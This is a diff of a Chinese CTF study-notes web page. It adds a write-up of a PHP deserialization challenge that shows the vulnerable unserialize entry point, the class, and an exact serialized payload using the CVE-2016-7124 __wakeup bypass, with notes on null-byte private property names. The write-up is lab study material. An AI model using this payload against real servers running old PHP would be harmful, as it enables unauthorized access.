@@ -1613,10 +1613,21 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#92" class="md-nav__link">
+  <a href="#92-2019-php-__wakeup" class="md-nav__link">
     <span class="md-ellipsis">
       
-        9.2 ⬜ 待打
+        9.2 ✅ [极客大挑战 2019] PHP —— __wakeup 绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#93" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9.3 ⬜ 待打
       
     </span>
   </a>
@@ -2739,10 +2750,21 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#92" class="md-nav__link">
+  <a href="#92-2019-php-__wakeup" class="md-nav__link">
     <span class="md-ellipsis">
       
-        9.2 ⬜ 待打
+        9.2 ✅ [极客大挑战 2019] PHP —— __wakeup 绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#93" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9.3 ⬜ 待打
       
     </span>
   </a>
@@ -3170,14 +3192,60 @@
 </span></code></pre></div>
 <p><strong>对应 WP:<a href="../../../blog/zjctf-nizhuansiwei/">/blog/zjctf-nizhuansiwei/</a></strong></p>
 <p><strong>这题只用到一层,是最干净的反序列化入门。</strong></p>
-<h3 id="92">9.2 ⬜ 待打<a class="headerlink" href="#92" title="Permanent link">&para;</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>· [BUUCTF] PHP 反序列化基础题
-</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>· [HCTF 2018] WarmUp(已做,但不是反序列化)
-</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>· [MRCTF 2020] Ezpop            ← 经典 POP 链
-</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>· [GXYCTF 2019] Babysqli?       ← 不是
-</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>· [网鼎杯] PHP 反序列化系列
-</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>· [极客大挑战 2019] PHP          ← __wakeup 绕过
-</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a>· phar 反序列化专项题
+<h3 id="92-2019-php-__wakeup">9.2 ✅ [极客大挑战 2019] PHP —— <code>__wakeup</code> 绕过<a class="headerlink" href="#92-2019-php-__wakeup" title="Permanent link">&para;</a></h3>
+<p><strong>入口:</strong></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="x">include 'class.php';</span>
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="x">$select = $_GET['select'];</span>
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="x">$res = unserialize(@$select);</span>
+</span></code></pre></div>
+<p><strong>类:</strong></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="x">class Name {</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="x">    private $username = 'nonono';</span>
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="x">    private $password = 'yesyes';</span>
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="x">    function __wakeup(){ $this-&gt;username = 'guest'; }   // ← 后门:反序列化后强制改名</span>
+</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>
+</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a><span class="x">    function __destruct(){</span>
+</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a><span class="x">        if ($this-&gt;password != 100) { echo "NO!!!hacker!!!"; die(); }</span>
+</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a><span class="x">        if ($this-&gt;username === 'admin') { global $flag; echo $flag; }</span>
+</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a><span class="x">    }</span>
+</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a><span class="x">}</span>
+</span></code></pre></div>
+<p><strong>分析:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>① 目标是 username === 'admin' 且 password == 100
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>② 但 __wakeup 会把 username 改成 guest
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>③ 必须让 __wakeup 不执行
+</span></code></pre></div>
+<p><strong>payload:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>O:4:"Name":3:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;}
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>              └───────── 14 字节 ─────────┘
+</span></code></pre></div>
+<p><strong>两个细节:</strong></p>
+<table>
+<thead>
+<tr>
+<th>细节</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>属性数写 3</strong>（实际只有 2 个）</td>
+<td><code>__wakeup</code> 被跳过（CVE-2016-7124，PHP &lt; 5.6.25 / 7.0.10）</td>
+</tr>
+<tr>
+<td><strong><code>private</code> 属性名带 <code>\0</code></strong></td>
+<td><code>\0Name\0username</code> = 14 字节；URL 里写 <code>%00</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>⚠️ 新版 PHP 上 <code>:3:</code> 不是跳过 <code>__wakeup</code>，而是整个包</strong>解析失败<strong>。这题只在老版本环境成立。</strong></p>
+<p>→ 详见 WP：<a href="../../../blog/geek2019-php/">/blog/geek2019-php/</a></p>
+<h3 id="93">9.3 ⬜ 待打<a class="headerlink" href="#93" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>· [MRCTF 2020] Ezpop            经典 POP 链
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>· phar 反序列化专项题
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>· [网鼎杯] PHP 反序列化系列
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>· Java 的 ysoserial 链(如果打 Java 题)
 </span></code></pre></div>
 <hr />
 <h2 id="_12">十、我踩的坑<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h2>
